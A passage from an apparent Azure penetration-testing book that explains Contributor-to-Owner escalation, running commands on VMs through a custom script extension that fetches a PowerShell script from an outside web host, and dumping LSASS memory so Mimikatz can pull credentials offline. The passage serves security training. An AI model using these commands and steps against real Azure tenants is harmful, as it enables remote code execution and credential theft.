  md: 'Here is a screenshot of the first command and its output:


    ![](img/4fa338e84e0a590967a142dd798ba4e2_212_0.png)


    Figure 5.25 – Example list of the available subscriptions


    Congratulations! You have successfully performed a privilege escalation from the
    Contributor role to the Owner role.


    # Executing VM extensions


    As a final note on this section, we wanted to include using VM extensions to run
    commands on VMs. While this is not the simplest way to run commands, it may be
    your only option in certain situations.


    Azure VM extensions are tools used by administrators to configure VMs after they
    have been deployed. As a way of customizing these extensions for different uses,
    Microsoft allows for custom script extensions to be created, based on a schema
    that they have defined.


    This schema includes file URIs or URLs that point to script files that allow us
    to specify a PowerShell file that we want to execute. As attackers, we will need
    a web server to host the file URIs. We would suggest either using the web hosting
    feature built into Azure Blob Storage or using Azure App Service for hosting the
    files.'
  merge: -1
  img_proc: true
- pgno: 213
  md: 'The command for running the custom script extension consists of the following
    parameters:


    +   - **ResourceGroupName**: The resource group for the VM.

    +   - **VMName**: The name of the VM.

    +   - **Location**: The region the VM is in.

    +   - **FileUri**: The HTTP/HTTPS URL for the script file.

    +   - **Run**: The file to run; this should be the same as the ps1 filename.

    +   - **Name**: The name that the custom script extension will have:


    ```

    PS C:\> Set-AzVMCustomScriptExtension -ResourceGroupName TEST -VMName PentestVM
    -Location westcentralus -FileUri ''http://book.azurepentesting.com/whoami.ps1''
    -Run ''whoami.ps1'' -Name CustomScriptExtension

    ```


    In the preceding command example, we will run the whoami.ps1 script (hosted on
    book.azurepentesting.com) on the PentestVM host. In a more practical scenario,
    we would use the custom script extension to create a reverse shell or add a new
    user to the VM.


    > **Important note**

    > This chapter happens to feature two research items from one of the book''s technical
    reviewers, Jake Karnes. We highly recommend checking out his in-depth post on
    using Azure VM extensions to launch Covenant C2 implants on Azure VMs: https://blog.netspi.com/attacking-azure-with-custom-script-extensions/.


    While this is another blind command execution method, it can be handy for getting
    an initial foothold onto a VM. This method also concludes our section on the Azure
    features that we can use as a Contributor on a subscription. Next, we will review
    the data that we want to gather from the VMs using the methods we just reviewed.'
  merge: -1
  img_proc: true
- pgno: 214
  md: '# Extracting data from Azure VMs


    We now have a good understanding of many of the options that we have for manipulating
    Azure VMs as a Contributor. With this access, we will want to start gathering
    sensitive information and credentials from these VMs, to escalate privileges in
    the tenant and, potentially, the AD domain.


    Here are some of the general types of information that we will want to gather
    from the VMs:


    +   - Windows NTLM hashes and in-memory credentials

    +   - Credentials stored in VM extension settings

    +   - Sensitive files and local administrator password hashes


    We have already covered finding managed identities and gathering tokens from them,
    but they are also a key target for extracting credential data from VMs.


    # Gathering local credentials with Mimikatz


    While an entire book could be written on all the features of Mimikatz, we will
    just cover the basics that are needed for extracting credentials from Windows
    VMs. The most basic way of running Mimikatz is running the executable on a victim
    machine. While this can work, any reasonably up-to-date Endpoint Detection and
    Response (EDR) software will catch the executable as soon as it is written to
    the virtual disk.


    If we are dealing with a less mature EDR, we could try running it in memory with
    the Invoke-Mimikatz PowerShell script, or by using another technique to load Mimikatz
    directly into memory. This may be viable for some weaker EDR configurations, but
    we see this get caught more frequently as well.


    Finally, we can try dumping the LSASS process memory and parsing it offline with
    Mimikatz. This prevents us from ever putting Mimikatz on a VM, and it is much
    less likely to throw out any alerts. Many of the defensive tools are now monitoring
    the LSASS process and protecting the memory space from being dumped, so your mileage
    may vary.


    On the plus side, it is not uncommon to run into a development VM with little
    to no endpoint protection on it. These can be great sources of credentials or
    they can be totally empty development machines. Either way, we will go through
    our final technique as an example of running Mimikatz offline to parse an LSASS
    dump as follows:


    +   1. On the target VM, open Task Manager (press Ctrl + Shift + Esc or type taskmgr
    in the Start menu).'
  merge: -1
  img_proc: true
- pgno: 215
  md: '+   2. Under the **Details** tab, find the lsass.exe process.

    +   3. Right-click on the lsass process and select **Create dump file**:


    ![](img/4fa338e84e0a590967a142dd798ba4e2_215_0.png)


    Figure 5.26 – Creating the LSASS dump file


    +   4. When the dump file has finished writing, Windows will share the file path
    of the resulting .dmp file.

    +   5. Navigate to the folder and copy the .dmp file from the VM to your testing
    system.

    +   6. On your testing system, open a privileged PowerShell or CMD session and
    download Mimikatz from GitHub: https://github.com/gentilkiwi/mimikatz.

    +   7. Run the Mimikatz executable and load the .dmp file into Mimikatz with the
    sekurlsa::minidump lsass.dmp command.'
  merge: -1
  img_proc: true
